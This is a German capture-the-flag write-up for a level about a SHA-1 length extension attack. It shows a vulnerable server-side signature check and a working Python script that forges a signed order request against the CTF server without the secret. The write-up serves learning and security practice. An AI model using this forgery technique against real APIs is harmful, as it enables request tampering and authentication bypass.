LEVEL 07
========

SHA1 length extension attack

[http://www.vnsecurity.net/t/length-extension-attack/](http://www.vnsecurity.net/t/length-extension-attack/)

---

Bei Level 7 handelt es sich um einen SHA 1 Length Extension Attack.

    def verify_signature(user_id, sig, raw_params):
        # get secret token for user_id
        try:
            row = g.db.select_one('users', {'id': user_id})
        except db.NotFound:
            raise BadSignature('no such user_id')
        secret = str(row['secret'])

        h = hashlib.sha1()
        h.update(secret + raw_params)
        print 'computed signature', h.hexdigest(), 'for body', repr(raw_params)
        if h.hexdigest() != sig:
            raise BadSignature('signature does not match')
        return True

Es wird also eine Anfrage an den wafflecopter gesendet, dessen Signatur mit hashlib.sha1(api\_secret + params).hexdigest() generiert wird. Serverseitig muss diese Signatur mit hashlib.sha1(hinterlegtes\_secret + params).hexdigest() übereinstimmen. Wichtig ist auch, dass wir die Logs von jedem Nutzer einsehen können - auch von User 1, der Zugang zu der begehrten _Liege-Waffle_ hat. Daraus können wir sehen, welche Anfrage bereits von dem User gemacht wurde und welche Signatur dabei generiert wurde - das Secret bleibt unbekannt. Wie auf [VNSECURITY](http://www.vnsecurity.net/t/length-extension-attack/" target="_blank) beschrieben kann hier ein SHA1 Length Extension Attack angewendet werden, der es erlaubt die übertragenen Parameter zu verändern und eine neue valide Signatur zu generieren, ohne den Secret zu kennen. Wie und warum und was und überhaupt kann der interessierte Leser hier sehen: [Flickr's API Signature Forgery Vulnerability](http://netifera.com/research/flickr_api_signature_forgery.pdf). Nutzen wir einfach das Script und schon lässt uns der Server eine begehrte _Liege-Waffle_ haben!

    #!/usr/bin/env python
    #
    # sha1 padding/length extension attack
    # by rd@vnsecurity.net
    #

    import sys
    import base64
    import requests
    from shaext import shaext

    key = 'GHBD30wBR5DvjK'
    keylen = len(key)
    orig_msg = 'count=2&lat=37.351&user_id=1&long=-119.827&waffle=chicken' #< original message
    orig_sig = '38ee18cd57e1ca3ba2c624b876afe9ea41a8b45c'   #< original hash
    add_msg = '&waffle=liege'

    ext = shaext(orig_msg, keylen, orig_sig)
    ext.add(add_msg)

    (new_msg, new_sig) = ext.final()

    body = "%s|sig:%s" % (new_msg, new_sig)
    print "\nBODY: %s" % body
    resp = requests.post('https://level07-2.stripe-ctf.com/user-xxxxxxxxx/orders', data=body)
    #resp = requests.post('http://localhost:9233/orders', data=body)
    print resp.text